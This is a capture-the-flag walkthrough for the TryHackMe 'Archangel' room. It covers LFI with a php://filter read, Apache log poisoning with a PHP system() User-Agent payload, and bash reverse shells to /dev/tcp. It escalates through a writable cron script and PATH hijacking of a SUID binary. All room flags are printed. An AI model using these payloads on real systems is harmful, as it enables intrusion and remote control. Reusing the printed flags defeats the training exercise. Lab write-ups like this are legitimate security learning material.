## Archangel - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/archangel)

**IP: archangel.thm**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web, LFI <br>

**Tools Used**: Nmap, Gobuster, Burp Suite<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap scan and Gobuster.

  ```
  nmap -sV -sC -T5 -p- archangel.thm

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
  |   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
  |_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http-title: Wavefire
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  gobuster dir -u http://archangel.thm -w /usr/share/wordlists/dirb/common.txt
  
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.hta                 (Status: 403) [Size: 278]
  /.htaccess            (Status: 403) [Size: 278]
  /.htpasswd            (Status: 403) [Size: 278]
  /flags                (Status: 301) [Size: 314] [--> http://archangel.thm/flags/]
  /images               (Status: 301) [Size: 315] [--> http://archangel.thm/images/]
  /index.html           (Status: 200) [Size: 19188]
  /layout               (Status: 301) [Size: 315] [--> http://archangel.thm/layout/]
  /pages                (Status: 301) [Size: 314] [--> http://archangel.thm/pages/]
  /server-status        (Status: 403) [Size: 278]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- First of all you must visit `http://archangel.thm/flags/flags.html` because it's the CLASSIC !!! ❤️
  
- On the support page of main domain you'll see `Mafialive Solutions`. That's new domain, add it to `/etc/hosts` and visit it for the first flag. `thm{f0und_th3_r1ght_h0st_n4m3} `

- I always check `/robots.txt` (bug bounty habit lol) and there I found hidden page.

  ```
  http://mafialive.thm/robots.txt
  User-agent: *
  Disallow: /test.php
  ```

- When you visit `/test.php` you will have a button that when pressed will redirect you to `http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php`.

- This smells like LFI, so I captured the request with Burp and started experimenting with it. `/etc/passwd` is not allowed without path traversal but with some encoding I got access to `/test.php`

  ```
  http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php

  CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4[SNIP!]
  ```

- It's a long string, decode it and you'll get a second flag.

  ```
  echo 'string' | base64 -d
  <!DOCTYPE HTML>
  <html>
  
  <head>
      <title>INCLUDE</title>
      <h1>Test Page. Not to be Deployed</h1>
   
      </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
          <?php
  
              //FLAG: thm{explo1t1ng_lf1}
  
              function containsStr($str, $substr) {
                  return strpos($str, $substr) !== false;
              }
              if(isset($_GET["view"])){
              if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
                  include $_GET['view'];
              }else{
  
                  echo 'Sorry, Thats not allowed';
              }
          }
          ?>
      </div>
  </body>
  
  </html>
  ```
  
---

## 🌐 Web Exploitation (if applicable)

- OK, so this took a while not gonna lie. I found an exposed endpoint and option to inject commands via URL but couldn't upload reverse shell that way. I tried everything honestly, here's the endpoint, it's `/apache/access.log`.

  ```
  http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log
  ```
  
- You can add `&cmd=wget http://[YOUR-THM-IP/shell.php]` and upload shell that way with Python server but I coudln't do it that way. I received 0 connections everytime I tried to upload it. So I went to Burp.
  
- In order to get reverse shell, you will need to edit `User-Agent` and add command to the exposed endpoint. Start a listener before you send the Burp request and you should get a shell on your netcat.
  Added command to the endpoint must be URL encoded as well.

  ```
  Full payload
  /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=/bin/bash -c 'bash -i > /dev/tcp/[YOUR-THM-IP]/4444 0>&1'

  BURP:
  GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=/bin/bash+-c+'bash+-i+>+/dev/tcp/[YOUR-THM-IP]/4444+0>%261' HTTP/1.1

  User-Agent: <?php system($_GET[cmd]); ?>

  nc -lvnp 4444
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.191.193] 47750
  whoami
  www-data
  id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```

- I forgot to copy/paste Burp payload, my bad guys... Change the shell to putty and move to the next flag.

---

## 🧍 User Privilege Escalation

- First flag is already there waiting for you.

  ```
  www-data@ubuntu:/home/archangel$ ls -la
  total 44
  drwxr-xr-x 6 archangel archangel 4096 Nov 20  2020 .
  drwxr-xr-x 3 root      root      4096 Nov 18  2020 ..
  -rw-r--r-- 1 archangel archangel  220 Nov 18  2020 .bash_logout
  -rw-r--r-- 1 archangel archangel 3771 Nov 18  2020 .bashrc
  drwx------ 2 archangel archangel 4096 Nov 18  2020 .cache
  drwxrwxr-x 3 archangel archangel 4096 Nov 18  2020 .local
  -rw-r--r-- 1 archangel archangel  807 Nov 18  2020 .profile
  -rw-rw-r-- 1 archangel archangel   66 Nov 18  2020 .selected_editor
  drwxr-xr-x 2 archangel archangel 4096 Nov 18  2020 myfiles
  drwxrwx--- 2 archangel archangel 4096 Nov 19  2020 secret
  -rw-r--r-- 1 archangel archangel   26 Nov 19  2020 user.txt
  
  www-data@ubuntu:/home/archangel$ cat user.txt 
  thm{lf1_t0_rc3_1s_tr1cky}
  
  www-data@ubuntu:/home/archangel$ cat secret/
  cat: secret/: Permission denied
  ```
  
- OK, so we will need to escalate 2 times here, first to `archangel` then to `root`. I checked `myfiles` and you wont believe what I found there.

  ```
  www-data@ubuntu:/home/archangel$ cd myfiles/
  www-data@ubuntu:/home/archangel/myfiles$ ls -al
  total 12
  drwxr-xr-x 2 archangel archangel 4096 Nov 18  2020 .
  drwxr-xr-x 6 archangel archangel 4096 Nov 20  2020 ..
  -rw-r--r-- 1 root      root        44 Nov 18  2020 passwordbacku
  
  www-data@ubuntu:/home/archangel/myfiles$ cat passwordbackup 
  https://www.youtube.com/watch?v=dQw4w9WgXcQ
  ```
  
- CLASSIC AGAIN LEGOOOOOOOOOOOOO !!! ❤️ After checking cronjobs I found the way to `archangel`.

  ```
  www-data@ubuntu:/home/archangel$ cat /etc/crontab
  # /etc/crontab: system-wide crontab
  # Unlike any other crontab you don't have to run the `crontab'
  # command to install the new version when you edit this file
  # and files in /etc/cron.d. These files also have username fields,
  # that none of the other crontabs do.
  
  SHELL=/bin/sh
  PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
  
  # m h dom mon dow user  command
  */1 *   * * *   archangel /opt/helloworld.sh
  17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
  25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
  47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
  52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
  #
  www-data@ubuntu:/home/archangel$ cat /opt/helloworld.sh 
  #!/bin/bash
  echo "hello world" >> /opt/backupfiles/helloworld.txt
  
  www-data@ubuntu:/home/archangel$ ls -al /opt/helloworld.sh 
  -rwxrwxrwx 1 archangel archangel 66 Nov 20  2020 /opt/helloworld.sh
  ```

- Perfect, it's a basic script that adds `hello world` to backupfiles, since we can read/write/execute the script let's add another reverse shell there.

  ```
  orld.sha@ubuntu:/opt$ echo 'bash -i >& /dev/tcp/[YOUR-THM-IP]/1234 0>&1 ' > hellowo
  www-data@ubuntu:/opt$ cat helloworld.sh 
  bash -i >& /dev/tcp/[YOUR-THM-IP]/1234 0>&1 
  
  nc -lvnp 1234 
  listening on [any] 1234 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.191.193] 38426
  bash: cannot set terminal process group (1303): Inappropriate ioctl for device
  bash: no job control in this shell
  archangel@ubuntu:~$ whoami
  whoami
  archangel
  archangel@ubuntu:~$ id
  id
  uid=1001(archangel) gid=1001(archangel) groups=1001(archangel)
  ```

- Tutorial ngl, now read the second user flag and move to root escalation.

  ```
  archangel@ubuntu:~$ cd secret   
  cd secret
  archangel@ubuntu:~/secret$ ls -al
  ls -al
  total 32
  drwxrwx--- 2 archangel archangel  4096 Nov 19  2020 .
  drwxr-xr-x 6 archangel archangel  4096 Nov 20  2020 ..
  -rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup
  -rw-r--r-- 1 root      root         49 Nov 19  2020 user2.txt
  
  archangel@ubuntu:~/secret$ cat user2.txt
  cat user2.txt
  thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}
  ```

---

## 👑 Root Privilege Escalation

- Since we are already there let's check that backup file. If you use `cat` you'll get bunch of giberrish but `strings` will do the work here.

  ```
  archangel@ubuntu:~/secret$ strings backup
  [SNIP!]
  []A\A]A^A_
  cp /home/user/archangel/myfiles/* /opt/backupfiles
  :*3$"
  GCC: (Ubuntu 10.2.0-13ubuntu1) 10.2.0
  /usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/Scrt1.o
  [SNIP!]
  ```
  
- OKI, so we will have to manipulate that `cp` file. This is pretty straightforward, we create a new file named `cp`, change it to executable, add a one-liner `bash -p` and then add that file directory to `PATH`.
  After everything is done just run the `backup` script and you'll be root.

  ```
  archangel@ubuntu:~/secret$ echo 'bash -p' > cp
  echo 'bash -p' > cp
  
  archangel@ubuntu:~/secret$ chmod +x cp
  chmod +x cp
  
  archangel@ubuntu:~/secret$ export PATH=/home/archangel/secret:$PATH
  export PATH=/home/archangel/secret:$PATH
  
  archangel@ubuntu:~/secret$ ./backup
  ./backup
  whoami
  root
  cat /root/root.txt
  thm{https://www.youtube.com/watch?v=dQw4w9WgXcQ} hehexd
  ```
  
- This one was worth the hustle, it took me more than an hour to get first reverse shell, everything after that was pretty standard. Enjoy the CLASSIC while hacking, cya! 💋

---

## 🏁 Flags

- **Flag 1**: `thm{f0und_th3_r1ght_h0st_n4m3}`
- **Flag 2**: `thm{explo1t1ng_lf1}`
- **User Flag**: `thm{lf1_t0_rc3_1s_tr1cky}`
- **User Flag 2**: `thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}`
- **Root Flag**: `thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Getting a first reverse shell.`

- What did I learn?
  `A lot, LFI, reverse shell with Burp, new privilege escalation kinda.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
